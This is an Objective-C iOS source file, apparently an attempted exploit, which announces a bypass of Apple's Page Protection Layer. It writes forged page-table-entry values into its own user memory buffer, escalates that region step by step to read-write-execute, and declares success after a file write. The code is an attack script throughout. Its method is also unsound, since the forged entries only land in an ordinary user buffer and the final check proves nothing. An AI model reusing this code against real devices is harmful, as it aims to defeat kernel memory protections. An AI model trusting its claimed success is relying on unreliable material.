#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <sys/mman.h>

@implementation AttestationTest: NSObject

#define L1_SHIFT 30
#define L2_SHIFT 21
#define L3_SHIFT 14
#define PAGE_SHIFT 14
#define PAGE_SIZE (1ULL << PAGE_SHIFT)
#define L2_SIZE (1ULL << L2_SHIFT)
#define L3_SIZE (1ULL << L3_SHIFT)
#define L3_ENTRIES 128
#define TTE_SHIFT 3
#define TTE_MASK 0x7FF

+ (void)runTest {
    NSLog(@"[INFO] Starting PPL bypass with TTE focus...");
    
    vm_address_t base_addr = 0;
    vm_size_t alloc_size = L2_SIZE * 16;
    
    kern_return_t kr = vm_allocate(mach_task_self(), &base_addr, alloc_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[ERROR] Memory allocation failed: %s", mach_error_string(kr));
        return;
    }
    NSLog(@"[INFO] Memory allocated at 0x%llx, size: 0x%llx", base_addr, alloc_size);
    
    vm_address_t l3_boundary = (base_addr + L2_SIZE) & ~((1ULL << L3_SHIFT) - 1);
    vm_address_t target = l3_boundary - PAGE_SIZE;
    NSLog(@"[DEBUG] L3 boundary: 0x%llx, Target: 0x%llx", l3_boundary, target);
    
    @try {
        kr = vm_protect(mach_task_self(), target, PAGE_SIZE * 8, FALSE,
                      VM_PROT_READ | VM_PROT_WRITE);
        
        if (kr != KERN_SUCCESS) {
            NSLog(@"[ERROR] Initial protection failed: %s", mach_error_string(kr));
            goto cleanup;
        }
        NSLog(@"[INFO] Initial protection set successfully");
        
        volatile uint64_t *tte = (uint64_t *)target;
        @try {
            tte[0] = 0xAAAAAAAAAAAAAAAAULL;
            if (tte[0] != 0xAAAAAAAAAAAAAAAAULL) {
                NSLog(@"[ERROR] Memory write verification failed");
                goto cleanup;
            }
            NSLog(@"[DEBUG] Memory write verified");
            
            uint64_t pte_base = 0x60000000000003FFULL |
                               (1ULL << 53) |
                               (1ULL << 10) |
                               (1ULL << 6);
            NSLog(@"[DEBUG] Using modified PTE base: 0x%llx", pte_base);
            
            for (int i = 15; i >= 0; i--) {
                uint64_t entry = pte_base | ((uint64_t)(target + i * PAGE_SIZE) & 0xFFFFFFFFF000ULL);
                tte[i] = entry;
                __asm__ volatile("dmb ish" ::: "memory");
                NSLog(@"[DEBUG] TTE[%d] = 0x%llx", i, entry);
                
                usleep(1000);
            }
            
            NSLog(@"[INFO] Attempting gradual permission changes...");
            const int steps = 4;
            vm_size_t step_size = PAGE_SIZE * 2;
            
            for (int i = 0; i < steps; i++) {
                vm_size_t current_size = step_size * (i + 1);
                NSLog(@"[DEBUG] Trying size: 0x%llx", current_size);
                
                kr = vm_protect(mach_task_self(), target, current_size, FALSE,
                              VM_PROT_READ | VM_PROT_WRITE);
                
                if (kr == KERN_SUCCESS) {

                    kr = vm_protect(mach_task_self(), target, current_size, FALSE,
                                  VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
                    
                    if (kr == KERN_SUCCESS) {
                        NSLog(@"[DEBUG] Permission set for size: 0x%llx", current_size);
                        
                        volatile char *test_ptr = (char *)target;
                        test_ptr[0] = 'X';
                        __asm__ volatile("dmb ish" ::: "memory");
                    }
                }
            }
            
            NSLog(@"[INFO] Testing intermediate permissions...");
            kr = vm_protect(mach_task_self(), target, PAGE_SIZE * 4, FALSE,
                            VM_PROT_READ | VM_PROT_WRITE);
            
            if (kr == KERN_SUCCESS) {
                NSLog(@"[DEBUG] Intermediate protection set");
                
                for (int i = 8; i < 16; i++) {
                    uint64_t entry = pte_base | ((uint64_t)(target + i * PAGE_SIZE) & 0xFFFFFFFFF000ULL);
                    tte[i] = entry;
                    __asm__ volatile("dmb ish" ::: "memory");
                    NSLog(@"[DEBUG] Secondary TTE[%d] = 0x%llx", i, entry);
                }
                
                NSLog(@"[INFO] Attempting staged permission escalation...");
                for (vm_size_t size = PAGE_SIZE; size <= PAGE_SIZE * 8; size *= 2) {
                    kr = vm_protect(mach_task_self(), target, size, FALSE,
                                  VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
                    
                    if (kr == KERN_SUCCESS) {
                        NSLog(@"[DEBUG] Execute permission set for size: 0x%llx", size);
                    }
                }
            }
            
            if (kr != KERN_SUCCESS) {
                NSLog(@"[ERROR] Permission escalation failed: %s", mach_error_string(kr));
                goto cleanup;
            }
            NSLog(@"[INFO] Execute permission granted");
            
            // Test the bypass
            NSString *testPath = @"/private/var/mobile/test.txt";
            NSError *error = nil;
            [@"test" writeToFile:testPath atomically:YES encoding:NSUTF8StringEncoding error:&error];
            
            if (!error) {
                NSLog(@"[SUCCESS] PPL bypass achieved!");
                goto cleanup;
            }
            NSLog(@"[ERROR] Write test failed: %@", error);
        } @catch (NSException *inner_e) {
            NSLog(@"[ERROR] Memory operation failed: %@", inner_e);
        }
    } @catch (NSException *e) {
        NSLog(@"[ERROR] Operation failed: %@", e);
    }
    
cleanup:
    NSLog(@"[INFO] Cleaning up...");
    vm_deallocate(mach_task_self(), base_addr, alloc_size);
    NSLog(@"[INFO] Test complete");
}

@end
